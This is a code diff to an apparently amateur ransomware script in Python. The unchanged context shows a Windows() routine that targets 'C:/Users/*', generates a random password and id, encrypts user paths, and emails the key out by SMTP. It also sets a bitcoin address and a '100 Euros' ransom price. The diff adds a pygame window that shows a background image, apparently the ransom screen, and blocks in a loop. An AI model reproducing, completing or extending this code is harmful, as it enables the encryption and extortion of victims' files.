@@ -13,6 +13,11 @@ import smtplib
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEText import MIMEText
 
+#https://openclassrooms.com/courses/interface-graphique-pygame-pour-python/premieres-fenetres
+import pygame
+from pygame.locals import *
+
+
 def Windows():
     path=('C:')
     text1=('C:/Users/*')
@@ -25,11 +30,32 @@ def Windows():
     pwd = str(''.join(random.sample(s, 8)))
     t=string.ascii_lowercase
     idd =str(''.join(random.sample(s, 10)))
+    
+    #inicialisamos pygame
+    pygame.init()
+    #creation fenetre vide
+    fenetre = pygame.display.set_mode((640, 480))
+    #Chargement et collage du fond
+    fond = pygame.image.load("background.jpg").convert()
+    fenetre.blit(fond, (0,0))
+
+    #Rafraîchissement de l'écran
+    pygame.display.flip()
+
+    #BOUCLE INFINIE
+    continuer = 1
+    while continuer:
+	    continuer = int(input())
+
+
+    
     mail(textexe)
     crypt(text1, pwd, path, bitcoin, price,verif)
     mail(textfin)
     crypt(text2, pwd, path, bitcoin, price,verif)
     mail(textall)
+    
+    
 
 bitcoin='18SXEt2zLcmYKCbZ6fx36QrmA2NuPAE9kq'
 price='100 Euros'
